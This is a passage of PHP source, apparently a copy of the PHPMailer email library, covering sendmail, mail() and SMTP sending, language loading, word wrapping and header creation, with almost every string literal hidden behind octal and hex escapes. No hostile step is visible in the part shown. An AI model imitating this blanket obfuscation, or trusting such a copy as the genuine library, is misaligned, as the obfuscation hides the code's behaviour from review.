$this->edebug("\105\156\166\x65\x6c\x6f\160\145\40\x73\x65\x6e\x64\145\x72\72\x20" . $this->Sender); $this->edebug("\x48\x65\141\144\145\x72\x73\72\40{$header}"); if ($this->SingleTo) { foreach ($this->SingleToArray as $toAddr) { $mail = @popen($sendmail, "\167"); if (!$mail) { throw new Exception($this->lang("\x65\x78\x65\143\165\164\145") . $this->Sendmail, self::STOP_CRITICAL); } $this->edebug("\124\157\72\x20{$toAddr}"); fwrite($mail, "\124\157\x3a\x20" . $toAddr . "\xa"); fwrite($mail, $header); fwrite($mail, $body); $result = pclose($mail); $addrinfo = static::parseAddresses($toAddr, true, $this->CharSet); $this->doCallback($result === 0, array(array($addrinfo["\141\144\144\162\145\163\163"], $addrinfo["\x6e\x61\155\145"])), $this->cc, $this->bcc, $this->Subject, $body, $this->From, array()); $this->edebug("\x52\145\x73\x75\154\164\72\x20" . ($result === 0 ? "\x74\x72\165\x65" : "\146\141\x6c\x73\145")); if (0 !== $result) { throw new Exception($this->lang("\x65\170\x65\x63\165\x74\145") . $this->Sendmail, self::STOP_CRITICAL); } } } else { $mail = @popen($sendmail, "\x77"); if (!$mail) { throw new Exception($this->lang("\145\x78\145\143\x75\164\145") . $this->Sendmail, self::STOP_CRITICAL); } fwrite($mail, $header); fwrite($mail, $body); $result = pclose($mail); $this->doCallback($result === 0, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From, array()); $this->edebug("\122\145\x73\165\x6c\x74\x3a\40" . ($result === 0 ? "\164\162\x75\x65" : "\x66\141\154\x73\145")); if (0 !== $result) { throw new Exception($this->lang("\145\x78\x65\143\x75\164\x65") . $this->Sendmail, self::STOP_CRITICAL); } } return true; } protected static function isShellSafe($string) { if (!function_exists("\x65\x73\x63\x61\x70\x65\x73\150\x65\154\x6c\x61\x72\x67") || !function_exists("\x65\163\143\141\x70\x65\x73\150\x65\154\x6c\143\155\144")) { return false; } if (escapeshellcmd($string) !== $string || !in_array(escapeshellarg($string), array("\47{$string}\47", "\42{$string}\42"))) { return false; } $length = strlen($string); for ($i = 0; $i < $length; ++$i) { $c = $string[$i]; if (!ctype_alnum($c) && strpos("\100\137\x2d\x2e", $c) === false) { return false; } } return true; } protected static function isPermittedPath($path) { return !preg_match("\43\x5e\133\x61\55\172\135\133\x61\x2d\x7a\x5c\x64\53\56\55\135\52\x3a\57\x2f\x23\x69", $path); } protected static function fileIsAccessible($path) { if (!static::isPermittedPath($path)) { return false; } $readable = is_file($path); if (strpos($path, "\134\134") !== 0) { $readable = $readable && is_readable($path); } return $readable; } protected function mailSend($header, $body) { $header = static::stripTrailingWSP($header) . static::$LE . static::$LE; $toArr = array(); foreach ($this->to as $toaddr) { $toArr[] = $this->addrFormat($toaddr); } $to = trim(implode("\54\40", $toArr)); if ($to === '') { $to = "\165\x6e\x64\x69\163\143\x6c\157\163\x65\144\55\162\145\x63\x69\160\x69\145\x6e\164\163\x3a\x3b"; } $params = null; $sendmail_from_value = ini_get("\x73\x65\156\144\x6d\x61\x69\x6c\137\x66\x72\157\155"); if (empty($this->Sender) && !empty($sendmail_from_value)) { $this->Sender = ini_get("\163\x65\156\144\x6d\141\151\x6c\137\146\162\x6f\155"); } if (!empty($this->Sender) && static::validateAddress($this->Sender)) { if (self::isShellSafe($this->Sender)) { $params = sprintf("\55\146\x25\x73", $this->Sender); } $old_from = ini_get("\163\145\x6e\144\155\x61\x69\x6c\137\146\x72\157\155"); ini_set("\163\x65\x6e\144\155\x61\151\x6c\137\146\x72\157\x6d", $this->Sender); } $result = false; if ($this->SingleTo && count($toArr) > 1) { foreach ($toArr as $toAddr) { $result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params); $addrinfo = static::parseAddresses($toAddr, true, $this->CharSet); $this->doCallback($result, array(array($addrinfo["\x61\144\144\x72\145\163\163"], $addrinfo["\156\x61\155\145"])), $this->cc, $this->bcc, $this->Subject, $body, $this->From, array()); } } else { $result = $this->mailPassthru($to, $this->Subject, $body, $header, $params); $this->doCallback($result, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From, array()); } if (isset($old_from)) { ini_set("\163\145\x6e\x64\155\x61\151\154\x5f\146\162\x6f\x6d", $old_from); } if (!$result) { throw new Exception($this->lang("\x69\156\163\x74\x61\156\164\151\x61\x74\x65"), self::STOP_CRITICAL); } return true; } public function getSMTPInstance() { if (!is_object($this->smtp)) { $this->smtp = new SMTP(); } return $this->smtp; } public function setSMTPInstance(SMTP $smtp) { $this->smtp = $smtp; return $this->smtp; } public function setSMTPXclientAttribute($name, $value) { if (!in_array($name, SMTP::$xclient_allowed_attributes)) { return false; } if (isset($this->SMTPXClient[$name]) && $value === null) { unset($this->SMTPXClient[$name]); } elseif ($value !== null) { $this->SMTPXClient[$name] = $value; } return true; } public function getSMTPXclientAttributes() { return $this->SMTPXClient; } protected function smtpSend($header, $body) { $header = static::stripTrailingWSP($header) . static::$LE . static::$LE; $bad_rcpt = array(); if (!$this->smtpConnect($this->SMTPOptions)) { throw new Exception($this->lang("\x73\155\164\160\x5f\143\x6f\156\156\x65\143\164\x5f\146\x61\151\154\145\144"), self::STOP_CRITICAL); } if ($this->UseSMTPUTF8 && !$this->smtp->getServerExt("\x53\x4d\124\120\125\x54\106\70")) { throw new Exception($this->lang("\x6e\157\137\163\155\164\x70\x75\164\x66\x38"), self::STOP_CRITICAL); } if ('' === $this->Sender) { $smtp_from = $this->From; } else { $smtp_from = $this->Sender; } if (count($this->SMTPXClient)) { $this->smtp->xclient($this->SMTPXClient); } if (!$this->smtp->mail($smtp_from)) { $this->setError($this->lang("\146\x72\x6f\155\137\146\x61\x69\x6c\x65\x64") . $smtp_from . "\x20\72\40" . implode("\54", $this->smtp->getError())); throw new Exception($this->ErrorInfo, self::STOP_CRITICAL); } $callbacks = array(); foreach (array($this->to, $this->cc, $this->bcc) as $togroup) { foreach ($togroup as $to) { if (!$this->smtp->recipient($to[0], $this->dsn)) { $error = $this->smtp->getError(); $bad_rcpt[] = array("\164\157" => $to[0], "\x65\x72\x72\x6f\x72" => $error["\144\145\164\x61\151\154"]); $isSent = false; } else { $isSent = true; } $callbacks[] = array("\x69\163\x73\x65\156\164" => $isSent, "\x74\157" => $to[0], "\x6e\x61\x6d\145" => $to[1]); } } if (count($this->all_recipients) > count($bad_rcpt) && !$this->smtp->data($header . $body)) { throw new Exception($this->lang("\x64\141\164\141\137\x6e\157\164\x5f\x61\143\143\x65\x70\164\x65\x64"), self::STOP_CRITICAL); } $smtp_transaction_id = $this->smtp->getLastTransactionID(); if ($this->SMTPKeepAlive) { $this->smtp->reset(); } else { $this->smtp->quit(); $this->smtp->close(); } foreach ($callbacks as $cb) { $this->doCallback($cb["\x69\163\x73\145\156\x74"], array(array($cb["\164\157"], $cb["\x6e\x61\x6d\145"])), array(), array(), $this->Subject, $body, $this->From, array("\163\x6d\164\160\137\x74\x72\141\x6e\163\x61\143\x74\x69\157\156\137\x69\x64" => $smtp_transaction_id)); } if (count($bad_rcpt) > 0) { $errstr = ''; foreach ($bad_rcpt as $bad) { $errstr .= $bad["\164\x6f"] . "\x3a\x20" . $bad["\x65\162\x72\157\x72"]; } throw new Exception($this->lang("\162\x65\x63\x69\x70\x69\x65\x6e\164\163\x5f\146\x61\x69\x6c\x65\144") . $errstr, self::STOP_CONTINUE); } return true; } public function smtpConnect($options = null) { if (null === $this->smtp) { $this->smtp = $this->getSMTPInstance(); } if (null === $options) { $options = $this->SMTPOptions; } if ($this->smtp->connected()) { return true; } $this->smtp->setTimeout($this->Timeout); $this->smtp->setDebugLevel($this->SMTPDebug); $this->smtp->setDebugOutput($this->Debugoutput); $this->smtp->setVerp($this->do_verp); $this->smtp->setSMTPUTF8($this->UseSMTPUTF8); if ($this->Host === null) { $this->Host = "\x6c\x6f\143\x61\x6c\x68\x6f\x73\164"; } $hosts = explode("\73", $this->Host); $lastexception = null; foreach ($hosts as $hostentry) { $hostinfo = array(); if (!preg_match("\57\x5e\50\x3f\x3a\x28\x73\163\154\x7c\x74\x6c\x73\x29\72\134\x2f\134\x2f\x29\x3f\x28\x2e\53\x3f\x29\x28\x3f\x3a\x3a\50\x5c\x64\x2b\51\51\77\x24\x2f", trim($hostentry), $hostinfo)) { $this->edebug($this->lang("\151\x6e\x76\141\x6c\151\144\137\150\157\163\x74\x65\156\x74\162\171") . "\40" . trim($hostentry)); continue; } if (!static::isValidHost($hostinfo[2])) { $this->edebug($this->lang("\151\x6e\x76\x61\154\151\x64\137\x68\x6f\x73\x74") . "\x20" . $hostinfo[2]); continue; } $prefix = ''; $secure = $this->SMTPSecure; $tls = static::ENCRYPTION_STARTTLS === $this->SMTPSecure; if ("\x73\x73\x6c" === $hostinfo[1] || '' === $hostinfo[1] && static::ENCRYPTION_SMTPS === $this->SMTPSecure) { $prefix = "\163\163\x6c\x3a\57\x2f"; $tls = false; $secure = static::ENCRYPTION_SMTPS; } elseif ("\x74\154\163" === $hostinfo[1]) { $tls = true; $secure = static::ENCRYPTION_STARTTLS; } $sslext = defined("\x4f\120\105\x4e\123\123\x4c\x5f\101\x4c\107\x4f\x5f\x53\x48\101\62\x35\66"); if (static::ENCRYPTION_STARTTLS === $secure || static::ENCRYPTION_SMTPS === $secure) { if (!$sslext) { throw new Exception($this->lang("\x65\170\x74\x65\156\163\151\x6f\156\137\155\151\163\163\151\x6e\x67") . "\157\160\145\x6e\x73\x73\154", self::STOP_CRITICAL); } } $host = $hostinfo[2]; $port = $this->Port; if (array_key_exists(3, $hostinfo) && is_numeric($hostinfo[3]) && $hostinfo[3] > 0 && $hostinfo[3] < 65536) { $port = (int) $hostinfo[3]; } if ($this->smtp->connect($prefix . $host, $port, $this->Timeout, $options)) { try { if ($this->Helo) { $hello = $this->Helo; } else { $hello = $this->serverHostname(); } $this->smtp->hello($hello); if ($this->SMTPAutoTLS && $this->Host !== "\154\x6f\143\x61\154\150\x6f\x73\x74" && $sslext && $secure !== "\163\163\x6c" && $this->smtp->getServerExt("\x53\x54\101\122\124\124\114\x53")) { $tls = true; } if ($tls) { if (!$this->smtp->startTLS()) { $message = $this->getSmtpErrorMessage("\x63\x6f\156\x6e\x65\143\x74\137\150\157\163\x74"); throw new Exception($message); } $this->smtp->hello($hello); } if ($this->SMTPAuth && !$this->smtp->authenticate($this->Username, $this->Password, $this->AuthType, $this->oauth)) { throw new Exception($this->lang("\x61\x75\x74\150\145\156\x74\x69\x63\141\164\x65")); } return true; } catch (Exception $exc) { $lastexception = $exc; $this->edebug($exc->getMessage()); $this->smtp->quit(); } } } $this->smtp->close(); if ($this->exceptions && null !== $lastexception) { throw $lastexception; } if ($this->exceptions) { $message = $this->getSmtpErrorMessage("\x63\x6f\x6e\x6e\x65\143\164\137\x68\157\163\164"); throw new Exception($message); } return false; } public function smtpClose() { if (null !== $this->smtp && $this->smtp->connected()) { $this->smtp->quit(); $this->smtp->close(); } } public function setLanguage($langcode = "\145\156", $lang_path = '') { $renamed_langcodes = array("\x62\162" => "\x70\164\137\142\x72", "\143\172" => "\x63\x73", "\x64\x6b" => "\144\141", "\156\x6f" => "\156\142", "\x73\145" => "\163\x76", "\162\x73" => "\163\x72", "\164\147" => "\x74\x6c", "\141\155" => "\x68\x79"); if (array_key_exists($langcode, $renamed_langcodes)) { $langcode = $renamed_langcodes[$langcode]; } $PHPMAILER_LANG = array("\141\x75\x74\150\x65\156\x74\151\143\141\164\145" => "\x53\x4d\x54\x50\40\x45\x72\x72\x6f\x72\72\x20\103\x6f\x75\x6c\144\40\156\157\x74\40\141\165\x74\x68\145\x6e\164\151\143\141\164\x65\56", "\x62\x75\x67\x67\171\x5f\160\150\x70" => "\131\157\x75\162\40\x76\x65\162\x73\x69\157\156\x20\x6f\x66\40\x50\x48\x50\x20\151\163\x20\x61\x66\146\145\143\164\145\144\x20\142\171\40\141\x20\x62\165\147\40\x74\x68\141\x74\x20\x6d\x61\171\40\x72\x65\x73\x75\154\x74\40\151\156\x20\143\157\x72\162\x75\160\x74\145\x64\x20\155\x65\163\163\141\147\x65\x73\x2e" . "\x20\124\x6f\x20\x66\x69\170\x20\151\164\54\40\x73\x77\x69\164\x63\150\40\164\x6f\x20\163\145\x6e\144\x69\156\147\40\165\163\x69\156\x67\x20\x53\115\x54\x50\x2c\40\144\x69\163\x61\142\154\145\x20\x74\x68\x65\x20\x6d\141\x69\154\56\x61\144\144\x5f\x78\137\150\145\x61\x64\145\162\40\157\160\x74\151\x6f\156\x20\x69\x6e" . "\x20\171\x6f\x75\x72\x20\x70\x68\x70\56\x69\x6e\x69\54\40\x73\x77\151\x74\x63\150\x20\x74\x6f\x20\115\141\x63\x4f\123\40\x6f\x72\x20\114\151\156\x75\170\x2c\x20\157\x72\40\x75\x70\147\x72\x61\144\145\40\x79\x6f\165\x72\40\x50\x48\120\40\164\x6f\40\x76\x65\x72\163\151\x6f\x6e\40\x37\x2e\x30\x2e\61\x37\x2b\x20\x6f\162\x20\67\x2e\61\56\63\x2b\x2e", "\x63\x6f\x6e\x6e\x65\x63\x74\x5f\x68\157\x73\164" => "\x53\x4d\x54\x50\40\x45\162\x72\x6f\x72\x3a\x20\x43\x6f\x75\154\x64\x20\x6e\x6f\x74\x20\x63\157\x6e\156\x65\143\x74\x20\164\157\40\123\115\124\x50\40\150\157\x73\164\56", "\144\141\164\141\x5f\x6e\x6f\164\x5f\x61\x63\143\x65\160\164\145\x64" => "\x53\x4d\x54\120\x20\105\162\162\x6f\162\72\40\x64\x61\164\x61\x20\156\157\164\x20\x61\x63\143\x65\x70\x74\145\144\56", "\145\x6d\160\164\x79\137\155\145\x73\x73\141\x67\145" => "\115\145\x73\163\x61\147\145\40\x62\157\x64\x79\40\145\x6d\x70\x74\171", "\145\156\143\157\144\x69\156\147" => "\125\x6e\x6b\156\x6f\167\x6e\40\x65\156\143\157\144\151\x6e\x67\x3a\x20", "\145\170\x65\x63\x75\164\x65" => "\103\157\165\x6c\144\40\x6e\x6f\164\x20\145\x78\145\143\x75\164\x65\x3a\40", "\x65\170\164\x65\156\163\x69\x6f\156\137\x6d\151\x73\x73\151\156\x67" => "\105\170\x74\145\x6e\163\151\157\x6e\40\x6d\151\163\x73\151\156\147\72\40", "\146\151\154\145\x5f\x61\x63\x63\145\x73\x73" => "\x43\157\x75\x6c\x64\40\x6e\157\164\x20\x61\143\143\x65\x73\x73\40\146\151\154\145\72\40", "\x66\151\x6c\x65\x5f\x6f\x70\x65\x6e" => "\x46\151\x6c\145\40\x45\x72\x72\x6f\x72\x3a\40\x43\x6f\x75\x6c\x64\40\156\x6f\164\40\157\160\x65\156\x20\x66\151\x6c\x65\x3a\x20", "\x66\x72\x6f\155\x5f\146\x61\x69\x6c\145\x64" => "\124\x68\145\x20\146\x6f\154\x6c\157\167\x69\156\147\40\x46\x72\x6f\x6d\x20\141\144\x64\x72\x65\x73\163\40\146\141\x69\x6c\145\144\x3a\40", "\x69\156\163\x74\141\156\x74\x69\141\164\x65" => "\x43\x6f\165\154\x64\x20\156\x6f\164\x20\x69\156\x73\164\x61\156\x74\x69\141\164\x65\40\155\x61\151\154\x20\x66\165\156\x63\x74\151\157\156\56", "\x69\156\166\x61\154\x69\144\137\141\x64\x64\162\145\x73\163" => "\x49\156\x76\x61\154\x69\144\40\141\x64\x64\162\x65\x73\163\72\40", "\151\156\x76\x61\154\x69\x64\x5f\150\x65\x61\x64\145\162" => "\x49\156\166\x61\154\x69\x64\40\x68\x65\x61\x64\145\x72\40\156\x61\155\145\x20\x6f\162\x20\x76\141\x6c\x75\145", "\151\x6e\166\141\x6c\151\144\137\x68\x6f\x73\164\145\x6e\x74\162\x79" => "\111\156\166\141\154\x69\x64\x20\x68\x6f\163\x74\x65\x6e\164\162\171\x3a\x20", "\x69\x6e\x76\x61\x6c\151\x64\137\x68\157\x73\x74" => "\111\x6e\166\141\154\151\144\40\150\157\x73\x74\72\40", "\155\x61\151\154\145\x72\x5f\156\x6f\x74\137\163\x75\x70\160\157\162\164\x65\x64" => "\40\155\141\151\x6c\x65\162\x20\151\163\40\x6e\x6f\164\x20\x73\165\160\160\x6f\162\164\145\144\56", "\x70\162\157\166\x69\144\x65\137\141\x64\x64\x72\145\163\163" => "\131\x6f\x75\40\155\165\163\x74\40\160\162\157\x76\151\144\145\x20\x61\164\40\x6c\x65\x61\x73\164\40\157\x6e\145\40\x72\x65\143\x69\160\151\x65\x6e\164\x20\x65\x6d\x61\151\x6c\40\x61\x64\144\162\145\163\x73\56", "\162\x65\x63\x69\x70\151\145\x6e\164\163\x5f\x66\x61\x69\154\x65\x64" => "\123\115\124\120\40\x45\162\162\157\x72\72\40\x54\x68\145\x20\146\x6f\154\154\157\167\151\x6e\x67\40\162\x65\x63\151\x70\151\x65\x6e\164\163\x20\146\x61\x69\x6c\x65\x64\72\40", "\x73\151\x67\x6e\x69\x6e\x67" => "\x53\151\147\156\x69\156\x67\40\x45\162\x72\x6f\162\x3a\x20", "\x73\155\x74\160\x5f\x63\157\144\x65" => "\x53\x4d\x54\x50\x20\143\157\144\145\72\40", "\x73\x6d\x74\160\x5f\x63\157\x64\x65\137\145\170" => "\101\144\x64\151\164\x69\157\156\141\x6c\40\123\115\124\120\x20\151\x6e\146\157\x3a\40", "\x73\x6d\x74\160\137\143\x6f\x6e\156\145\x63\164\137\146\x61\x69\154\x65\x64" => "\x53\115\124\x50\40\143\157\156\x6e\x65\143\x74\x28\x29\40\146\x61\x69\x6c\x65\144\56", "\x73\155\164\x70\x5f\x64\x65\x74\x61\x69\154" => "\104\x65\x74\x61\x69\x6c\72\x20", "\x73\x6d\164\x70\x5f\145\x72\x72\157\162" => "\x53\x4d\124\x50\x20\x73\145\162\x76\x65\x72\40\x65\x72\x72\157\162\72\x20", "\166\141\x72\x69\141\142\x6c\x65\137\163\x65\164" => "\103\x61\x6e\x6e\157\x74\40\x73\x65\x74\40\157\162\40\162\x65\x73\145\x74\40\x76\141\162\x69\x61\x62\154\145\x3a\x20", "\156\x6f\x5f\163\x6d\x74\160\x75\x74\146\x38" => "\x53\x65\162\166\x65\x72\40\144\157\145\x73\x20\156\157\164\40\163\x75\x70\160\x6f\x72\164\x20\x53\x4d\x54\120\x55\x54\106\x38\x20\x6e\145\x65\x64\145\144\x20\x74\x6f\40\163\x65\156\144\x20\164\157\40\125\156\151\x63\x6f\144\x65\40\141\x64\144\x72\x65\163\163\145\x73"); if (empty($lang_path)) { $lang_path = dirname(__DIR__) . DIRECTORY_SEPARATOR . "\154\141\x6e\147\165\141\147\x65" . DIRECTORY_SEPARATOR; } $foundlang = true; $langcode = strtolower($langcode); if (!preg_match("\x2f\136\x28\x3f\120\74\x6c\x61\156\x67\76\x5b\141\55\x7a\x5d\x7b\62\x7d\51\x28\x3f\x50\74\163\x63\x72\151\x70\164\76\x5f\x5b\141\55\172\x5d\173\x34\x7d\x29\x3f\50\x3f\120\x3c\x63\x6f\165\x6e\x74\x72\x79\x3e\137\x5b\141\55\172\135\x7b\x32\x7d\x29\x3f\x24\57", $langcode, $matches) && $langcode !== "\x65\156") { $foundlang = false; $langcode = "\145\x6e"; } if ("\x65\156" !== $langcode) { $langcodes = array(); if (!empty($matches["\163\x63\x72\x69\x70\x74"]) && !empty($matches["\x63\157\x75\156\164\x72\171"])) { $langcodes[] = $matches["\x6c\141\x6e\147"] . $matches["\x73\x63\162\151\x70\164"] . $matches["\x63\x6f\x75\156\164\x72\x79"]; } if (!empty($matches["\x63\157\x75\156\x74\x72\171"])) { $langcodes[] = $matches["\x6c\141\x6e\147"] . $matches["\143\157\x75\x6e\164\162\x79"]; } if (!empty($matches["\163\x63\162\x69\160\164"])) { $langcodes[] = $matches["\x6c\x61\x6e\147"] . $matches["\163\x63\x72\151\x70\164"]; } $langcodes[] = $matches["\154\141\x6e\147"]; $foundFile = false; foreach ($langcodes as $code) { $lang_file = $lang_path . "\x70\x68\160\x6d\141\x69\154\x65\162\56\154\x61\156\147\x2d" . $code . "\56\x70\x68\x70"; if (static::fileIsAccessible($lang_file)) { $foundFile = true; break; } } if ($foundFile === false) { $foundlang = false; } else { $lines = file($lang_file); foreach ($lines as $line) { $matches = array(); if (preg_match("\x2f\136\x5c\44\120\110\x50\115\101\x49\x4c\105\122\137\114\x41\116\x47\x5c\133\x27\50\133\x61\x2d\172\134\x64\x5f\x5d\53\x29\47\x5c\135\x5c\163\x2a\75\x5c\163\52\50\x5b\42\47\135\x29\x28\56\53\51\52\x3f\x5c\62\x3b\x2f", $line, $matches) && array_key_exists($matches[1], $PHPMAILER_LANG)) { $PHPMAILER_LANG[$matches[1]] = (string) $matches[3]; } } } } $this->language = $PHPMAILER_LANG; return $foundlang; } public function getTranslations() { if (empty($this->language)) { $this->setLanguage(); } return $this->language; } public function addrAppend($type, $addr) { $addresses = array(); foreach ($addr as $address) { $addresses[] = $this->addrFormat($address); } return $type . "\72\x20" . implode("\x2c\40", $addresses) . static::$LE; } public function addrFormat($addr) { if (!isset($addr[1]) || $addr[1] === '') { return $this->secureHeader($addr[0]); } return $this->encodeHeader($this->secureHeader($addr[1]), "\x70\150\162\141\163\x65") . "\40\74" . $this->secureHeader($addr[0]) . "\x3e"; } public function wrapText($message, $length, $qp_mode = false) { if ($qp_mode) { $soft_break = sprintf("\40\75\45\163", static::$LE); } else { $soft_break = static::$LE; } $is_utf8 = static::CHARSET_UTF8 === strtolower($this->CharSet); $lelen = strlen(static::$LE); $crlflen = strlen(static::$LE); $message = static::normalizeBreaks($message); if (substr($message, -$lelen) === static::$LE) { $message = substr($message, 0, -$lelen); } $lines = explode(static::$LE, $message); $message = ''; foreach ($lines as $line) { $words = explode("\x20", $line); $buf = ''; $firstword = true; foreach ($words as $word) { if ($qp_mode && strlen($word) > $length) { $space_left = $length - strlen($buf) - $crlflen; if (!$firstword) { if ($space_left > 20) { $len = $space_left; if ($is_utf8) { $len = $this->utf8CharBoundary($word, $len); } elseif ("\x3d" === substr($word, $len - 1, 1)) { --$len; } elseif ("\x3d" === substr($word, $len - 2, 1)) { $len -= 2; } $part = substr($word, 0, $len); $word = substr($word, $len); $buf .= "\x20" . $part; $message .= $buf . sprintf("\75\45\x73", static::$LE); } else { $message .= $buf . $soft_break; } $buf = ''; } while ($word !== '') { if ($length <= 0) { break; } $len = $length; if ($is_utf8) { $len = $this->utf8CharBoundary($word, $len); } elseif ("\x3d" === substr($word, $len - 1, 1)) { --$len; } elseif ("\75" === substr($word, $len - 2, 1)) { $len -= 2; } $part = substr($word, 0, $len); $word = (string) substr($word, $len); if ($word !== '') { $message .= $part . sprintf("\75\45\x73", static::$LE); } else { $buf = $part; } } } else { $buf_o = $buf; if (!$firstword) { $buf .= "\40"; } $buf .= $word; if ('' !== $buf_o && strlen($buf) > $length) { $message .= $buf_o . $soft_break; $buf = $word; } } $firstword = false; } $message .= $buf . static::$LE; } return $message; } public function utf8CharBoundary($encodedText, $maxLength) { $foundSplitPos = false; $lookBack = 3; while (!$foundSplitPos) { $lastChunk = substr($encodedText, $maxLength - $lookBack, $lookBack); $encodedCharPos = strpos($lastChunk, "\x3d"); if (false !== $encodedCharPos) { $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2); $dec = hexdec($hex); if ($dec < 128) { if ($encodedCharPos > 0) { $maxLength -= $lookBack - $encodedCharPos; } $foundSplitPos = true; } elseif ($dec >= 192) { $maxLength -= $lookBack - $encodedCharPos; $foundSplitPos = true; } elseif ($dec < 192) { $lookBack += 3; } } else { $foundSplitPos = true; } } return $maxLength; } public function setWordWrap() { if ($this->WordWrap < 1) { return; } switch ($this->message_type) { case "\x61\x6c\164": case "\141\x6c\x74\x5f\x69\156\x6c\151\156\x65": case "\x61\154\164\137\x61\x74\x74\141\x63\x68": case "\x61\154\x74\x5f\151\x6e\x6c\151\x6e\145\x5f\141\164\x74\141\x63\150": $this->AltBody = $this->wrapText($this->AltBody, $this->WordWrap); break; default: $this->Body = $this->wrapText($this->Body, $this->WordWrap); break; } } public function createHeader() { $result = ''; $result .= $this->headerLine("\x44\141\164\x65", '' === $this->MessageDate ? self::rfcDate() : $this->MessageDate); if ("\x6d\141\x69\x6c" !== $this->Mailer) { if ($this->SingleTo) { foreach ($this->to as $toaddr) { $this->SingleToArray[] = $this->addrFormat($toaddr); } } elseif (count($this->to) > 0) { $result .= $this->addrAppend("\124\157", $this->to); } elseif (count($this->cc) === 0) { $result .= $this->headerLine("\x54\157", "\165\x6e\x64\151\163\143\154\x6f\x73\x65\144\x2d\x72\x65\x63\151\160\x69\x65\x6e\x74\163\72\73"); } } $result .= $this->addrAppend("\106\162\x6f\x6d", array(array(trim($this->From), $this->FromName))); if (count($this->cc) > 0) { $result .= $this->addrAppend("\103\x63", $this->cc); } if (("\x73\x65\156\144\155\x61\x69\154" === $this->Mailer || "\161\155\x61\x69\x6c" === $this->Mailer || "\155\x61\151\x6c" === $this->Mailer) && count($this->bcc) > 0) { $result .= $this->addrAppend("\102\143\x63", $this->bcc); } if (count($this->ReplyTo) > 0) { $result .= $this->addrAppend("\x52\145\x70\154\171\x2d\124\157", $this->ReplyTo); } if ("\x6d\x61\x69\x6c" !== $this->Mailer) { $result .= $this->headerLine("\x53\x75\x62\152\x65\x63\x74", $this->encodeHeader($this->secureHeader($this->Subject))); } if ('' !== $this->MessageID && preg_match("\57\136\74\50\x28\50\133\141\55\172\134\144\x21\43\x24\x25\x26\x27\x2a\53\134\x2f\x3d\77\136\x5f\x60\173\174\x7d\176\x2d\135\53\50\134\x2e\133\141\55\172\x5c\144\41\x23\x24\45\x26\47\x2a\x2b\134\x2f\75\77\136\x5f\140\x7b\174\x7d\176\55\135\53\51\x2a\51" . "\174\x28\42\x28\x28\133\x5c\x78\60\x31\x2d\x5c\170\x30\70\134\x78\60\102\134\170\x30\x43\134\170\60\105\55\x5c\x78\x31\106\x5c\x78\67\x46\x5d\x7c\x5b\134\x78\62\61\x5c\170\x32\x33\55\x5c\x78\x35\x42\134\170\x35\104\55\134\170\x37\x45\135\x29" . "\x7c\x28\134\x5b\134\170\x30\61\x2d\134\170\x30\x39\x5c\x78\60\x42\x5c\170\60\103\134\170\60\x45\x2d\x5c\170\67\106\135\x29\x29\x2a\42\51\x29\100\50\x28\x5b\x61\x2d\172\x5c\144\x21\43\x24\x25\46\x27\52\53\x5c\x2f\x3d\77\136\x5f\140\173\174\175\176\55\x5d\53" . "\x28\x5c\56\133\x61\55\x7a\x5c\144\41\x23\44\x25\x26\x27\x2a\x2b\134\57\75\x3f\136\137\x60\173\174\x7d\x7e\55\x5d\53\x29\x2a\51\174\x28\x5c\x5b\x28\x28\133\x5c\170\60\61\x2d\134\170\60\x38\x5c\170\60\x42\x5c\x78\x30\x43\134\x78\x30\105\x2d\134\170\61\x46\x5c\170\x37\106\135" . "\x7c\133\134\170\62\x31\55\x5c\170\65\x41\x5c\x78\x35\x45\55\134\170\x37\x45\x5d\x29\174\50\134\x5b\134\170\x30\61\55\134\x78\60\71\x5c\170\60\102\134\170\60\103\134\x78\x30\105\x2d\134\x78\67\x46\135\51\x29\52\134\135\x29\x29\x29\x3e\44\x2f\x44\x69", $this->MessageID)) { $this->lastMessageID = $this->MessageID; } else { $this->lastMessageID = sprintf("\74\x25\x73\100\45\163\76", $this->uniqueid, $this->serverHostname()); } $result .= $this->headerLine("\115\x65\x73\x73\x61\147\x65\55\111\x44", $this->lastMessageID); if (null !== $this->Priority) { $result .= $this->headerLine("\x58\55\x50\162\151\x6f\x72\151\164\171", $this->Priority); } if ('' === $this->XMailer) { $result .= $this->headerLine("\x58\x2d\x4d\141\151\154\x65\x72", "\120\110\x50\115\x61\151\154\145\x72\x20" . self::VERSION . "\40\x28\150\164\164\160\x73\72\x2f\57\147\x69\164\x68\x75\142\56\x63\x6f\x6d\57\x50\x48\x50\x4d\x61\151\x6c\x65\x72\57\x50\110\x50\x4d\x61\151\154\145\162\51"); } elseif (is_string($this->XMailer) && trim($this->XMailer) !== '') { $result .= $this->headerLine("\x58\x2d\115\x61\151\x6c\145\162", trim($this->XMailer)); } if ('' !== $this->ConfirmReadingTo) { $result .= $this->headerLine("\104\x69\163\x70\157\x73\x69\x74\151\x6f\156\x2d\x4e\x6f\164\x69\x66\x69\143\x61\164\151\x6f\x6e\55\x54\x6f", "\x3c" . $this->ConfirmReadingTo . "\x3e"); } foreach ($this->CustomHeader as $header) { $result .= $this->headerLine(trim($header[0]), $this->encodeHeader(trim($header[1]))); } if (!$this->sign_key_file) { $result .= $this->headerLine("\x4d\x49\115\x45\x2d\x56\145\162\163\151\x6f\x6e", "\61\56\60"); $result .= $this->getMailMIME(); } return $result; } public function getMailMIME() { $result = ''; $ismultipart = true; switch ($this->message_type) { case "\x69\x6e\154\x69\x6e\x65": $result .= $this->headerLine("\103\x6f\x6e\164\145\x6e\x74\x2d\x54\x79\160\x65", static::CONTENT_TYPE_MULTIPART_RELATED . "\x3b"); $result .= $this->textLine("\40\142\x6f\x75\156\144\141\162\171\75\42" . $this->boundary[1] . "\x22"); break; case "\141\164\x74\x61\x63\x68": case "\x69\156\154\151\156\x65\x5f\141\164\x74\141\143\150": case "\x61\154\x74\x5f\x61\x74\x74\x61\143\150": case "\141\154\x74\137\151\x6e\x6c\151\156\x65\137\x61\164\164\x61\143\x68": $result .= $this->headerLine("\x43\x6f\x6e\x74\145\156\x74\55\124\171\160\145", static::CONTENT_TYPE_MULTIPART_MIXED . "\x3b"); $result .= $this->textLine("\40\142\157\165\x6e\144\x61\x72\171\x3d\x22" . $this->boundary[1] . "\42"); break; case "\141\154\164": case "\x61\154\164\137\x69\156\154\x69\156\x65": $result .= $this->headerLine("\103\x6f\x6e\164\x65\156\x74\55\x54\171\160\145", static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . "\x3b"); 